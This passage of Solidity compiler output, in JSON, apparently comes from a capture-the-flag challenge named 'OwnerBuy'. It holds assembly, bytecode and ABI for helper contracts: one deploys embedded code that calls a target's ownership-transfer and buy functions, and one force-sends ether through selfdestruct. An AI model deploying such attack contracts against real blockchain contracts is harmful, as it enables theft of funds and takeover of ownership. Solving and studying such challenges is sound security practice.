										{
											"begin": 10729,
											"end": 10756,
											"name": "SLOAD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "AND"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "ISZERO"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "MUL"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SUB"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "AND"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DIV"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "ISZERO"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "JUMPI"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "LT"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "JUMPI"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP4"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SLOAD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DIV"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "MUL"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP4"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "MSTORE"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP3"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "ADD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "JUMP"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "JUMPDEST"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP3"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "ADD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "MSTORE"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "KECCAK256"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "JUMPDEST"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SLOAD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "MSTORE"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "ADD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "ADD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP4"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "GT"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "JUMPI"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "JUMPDEST"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "POP"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "POP"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "POP"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "POP"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "MLOAD"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "DUP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP2"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SUB"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "SWAP1"
										},
										{
											"begin": 10729,
											"end": 10756,
											"name": "KECCAK256"
										},
										{
											"begin": 10722,
											"end": 10756,
											"name": "SWAP1"
										},
										{
											"begin": 10722,
											"end": 10756,
											"name": "POP"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "SWAP1"
										},
										{
											"begin": 10665,
											"end": 10768,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								},
								"4C860F020C00FBFDD70A1107A62BBB12045EAC8DC19C5BF6E8411D5A5D3EFCE8": "60806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032"
							}
						},
						"methodIdentifiers": {
							"deploy(bytes32)": "2b85ba38",
							"getHash()": "d13319c4"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.17+commit.d19bba13\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"salt\",\"type\":\"bytes32\"}],\"name\":\"deploy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getHash\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":\"deployed\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/OwnerBuy.sol\":{\"keccak256\":\"0x6c5b72099bc5f9740cbeb28650f50b1291a1eca5fbdbf6611673c9c8bcf2ba41\",\"urls\":[\"bzz-raw://f123693ee63491f5f4e4f8a62829af806c8814e5bdaaf6ce34ce08dbf396c33d\",\"dweb:/ipfs/QmPoszddSPRrmMRMFwfT9cXvCZmLbSEobQwqV2p1qEvd99\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20.sol\":{\"keccak256\":\"0x91a3b598fc86ea761b5a8296e26690e460e78d1606eb518994e5c2ba15fa194f\",\"urls\":[\"bzz-raw://f2e312a214c618db25822c5af3c0ea4811c7f42422b0d1051d468adbfbb53774\",\"dweb:/ipfs/QmdG5we7FRV1TFopjEvhSb63e5K2HUE3Y5fcdcR3CcuDe4\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/ERC20Detailed.sol\":{\"keccak256\":\"0xe20fce8726ac6988a627b4abae707647c8c46d9b5be24e0e085c718e854d9e34\",\"urls\":[\"bzz-raw://99a90f29bbd180bc88edf71c0583ec07d109bcfae5530aaffee434d0188c33e8\",\"dweb:/ipfs/Qmb2AKkdtcH2eWtXtaaSqABrLtBgcc9ppkn4iJPP89NNKp\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/IERC20.sol\":{\"keccak256\":\"0xd45135fede71fe4b2f06ccc22c459f880912785065a13f5ebf85ebe3d07d632e\",\"urls\":[\"bzz-raw://e38e11ed61a168499a2128f65c4248f9cb76a12fb0c9f2ae0e0e0ade46c5ba9f\",\"dweb:/ipfs/QmdAEvzLRsCtT6Yp1ruyymfaQ4hDtQMmBFjYY9MB4YQSBm\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u56db\\u9898/contracts/SafeMath.sol\":{\"keccak256\":\"0x11a066623aa9848c105e3610dd03f30d87881271d8da83a3974f898d5314025c\",\"urls\":[\"bzz-raw://76812a0f7047a8d98e291415723003b6238024ef37572453dcd96c70c946f9a7\",\"dweb:/ipfs/Qmf8SQN4J9ghTq3mVjxenmVAZtR8RnqvdfDvR5jma1gpJk\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 547,
								"contract": "赛题-预赛/第四题/OwnerBuy.sol:deployed",
								"label": "contractBytecode",
								"offset": 0,
								"slot": "0",
								"type": "t_bytes_storage"
							}
						],
						"types": {
							"t_bytes_storage": {
								"encoding": "bytes",
								"label": "bytes",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"self": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address payable",
									"name": "_addr",
									"type": "address"
								}
							],
							"name": "selfd",
							"outputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"赛题-预赛/第四题/OwnerBuy.sol\":10773:10885  contract self{\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"赛题-预赛/第四题/OwnerBuy.sol\":10773:10885  contract self{\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10773:10885  contract self{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8e154565\n      eq\n      tag_2\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10793:10882  function selfd(address payable _addr)public payable{\r... */\n    tag_2:\n      tag_3\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_4\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_4:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10793:10882  function selfd(address payable _addr)public payable{\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_5\n      jump\t// in\n    tag_3:\n      stop\n    tag_5:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10868:10873  _addr */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10855:10874  selfdestruct(_addr) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n\n    auxdata: 0xa265627a7a72315820b30918d0d9cb17467dad6a8ce35919060a97d5ce382a5c6136d1f4ab6b9b02ab64736f6c63430005110032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b5060b08061001e6000396000f3fe608060405260043610601c5760003560e01c80638e154565146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b8073ffffffffffffffffffffffffffffffffffffffff16fffea265627a7a72315820b30918d0d9cb17467dad6a8ce35919060a97d5ce382a5c6136d1f4ab6b9b02ab64736f6c63430005110032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xB0 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8E154565 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x62 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xB3 MULMOD XOR 0xD0 0xD9 0xCB OR CHAINID PUSH30 0xAD6A8CE35919060A97D5CE382A5C6136D1F4AB6B9B02AB64736F6C634300 SDIV GT STOP ORIGIN ",
							"sourceMap": "10773:112:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;10773:112:0;;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405260043610601c5760003560e01c80638e154565146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b8073ffffffffffffffffffffffffffffffffffffffff16fffea265627a7a72315820b30918d0d9cb17467dad6a8ce35919060a97d5ce382a5c6136d1f4ab6b9b02ab64736f6c63430005110032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8E154565 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x62 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xB3 MULMOD XOR 0xD0 0xD9 0xCB OR CHAINID PUSH30 0xAD6A8CE35919060A97D5CE382A5C6136D1F4AB6B9B02AB64736F6C634300 SDIV GT STOP ORIGIN ",
							"sourceMap": "10773:112:0:-;;;;;;;;;;;;;;;;;;;;;10793:89;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;10793:89:0;;;;;;;;;;;;;;;;;;;:::i;:::-;;;10868:5;10855:19;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "35200",
								"executionCost": "87",
								"totalCost": "35287"
							},
							"external": {
								"selfd(address)": "30186"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 10773,
									"end": 10885,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "MSTORE"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "CALLVALUE"
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "POP"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "DUP1"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "CODECOPY"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 10773,
									"end": 10885,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820b30918d0d9cb17467dad6a8ce35919060a97d5ce382a5c6136d1f4ab6b9b02ab64736f6c63430005110032",
									".code": [
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "MSTORE"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "LT"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "JUMPI"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "SHR"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "DUP1"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH",
											"value": "8E154565"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "EQ"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "JUMPI"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "JUMPDEST"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "DUP1"
										},
										{
											"begin": 10773,
											"end": 10885,
											"name": "REVERT"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "JUMPDEST"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "DUP1"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "DUP2"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "ADD"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "SWAP1"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "DUP1"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "DUP1"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "AND"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "SWAP1"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "ADD"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "SWAP1"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "SWAP3"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "SWAP2"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "SWAP1"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "POP"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "POP"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "POP"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "JUMPDEST"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "STOP"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 10793,
											"end": 10882,
											"name": "JUMPDEST"
										},
										{
											"begin": 10868,
											"end": 10873,
											"name": "DUP1"
										},
										{
											"begin": 10855,
											"end": 10874,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10855,
											"end": 10874,
											"name": "AND"
										},
										{
											"begin": 10855,
											"end": 10874,
											"name": "SELFDESTRUCT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"selfd(address)": "8e154565"
						}
					},
